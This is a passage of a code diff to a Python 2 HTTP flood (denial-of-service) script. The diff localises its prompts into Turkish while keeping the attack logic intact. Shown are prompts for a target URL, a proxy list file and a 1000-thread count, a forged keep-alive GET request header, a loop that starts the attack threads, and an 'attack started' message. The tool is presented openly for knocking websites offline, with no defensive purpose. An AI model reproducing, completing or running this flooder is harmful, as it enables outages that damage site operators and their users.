@@ -322,17 +322,17 @@ print('''
 	''')
         
 # Site
-url = raw_input("Hedef : (http://www.victim.com): ")
+url = raw_input("Hedef : ( http://www.ornek.com ): ")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
  
 #Proxy
-in_file = open(raw_input("File proxy(proxy.txt): "),"r")
+in_file = open(raw_input("Dosya Proxy ( Proxy.txt ): "),"r")
 proxyf = in_file.read()
 in_file.close()
  
 listaproxy = proxyf.split('\n')
 #So luong
-thread = input("So luong (1000): ") 
+thread = input("Güc ( 1000 ): ") 
 get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
 accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
@@ -342,8 +342,8 @@ x = 0
 for x in xrange(thread):
     attacco().start()
     time.sleep(0.003)
-print "Saldiri Basladi..."
-print "Ctrl + Z Bas..."
+print "Saldiri Basladi"
+print "Durdurmak İcin Bas Ctrl + Z"
 nload = 0
 while not nload:
     time.sleep(1)
